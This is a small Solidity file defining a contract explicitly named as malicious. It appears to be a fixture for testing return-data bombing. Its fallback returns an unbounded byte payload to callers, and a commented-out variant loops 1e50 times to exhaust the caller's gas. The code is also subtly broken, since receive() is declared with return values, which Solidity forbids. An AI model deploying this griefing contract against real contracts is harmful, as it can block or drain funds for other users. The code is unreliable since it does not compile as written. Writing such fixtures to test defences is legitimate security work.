// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {bytter} from "../src/bytes.sol";


contract Malicious_Contract is bytter {

    receive() external payable returns (bool, bytes memory){
        externalCall();
    }

    // error notAllowed();

    // fallback() external payable { // fallback function does not return any data
    //     revert notAllowed();
    // }

    fallback(bytes calldata) external payable returns (bytes memory baker) { // fallback function returning data
        baker = bytter.caker; // calling variable having data
        return baker; // returns unlimited data
    }

    // malicious fallback function having loop to cause OOG
    // fallback(bytes calldata) external payable returns (bytes memory) {
    //     bytes memory baker;
    //     uint256 count = 1e50; // count for iteration
    //     for (uint256 i; i < count; ++i) {  // loop run till count or OOG
    //         baker = abi.encode("datacheck");
    //     }
    //     return baker; // return 
    // }

    function externalCall() internal pure returns (bool maker, bytes memory baker) {
        baker = bytter.caker; // calling variable having data
        return (maker, baker); // returns unlimited data
    }

}
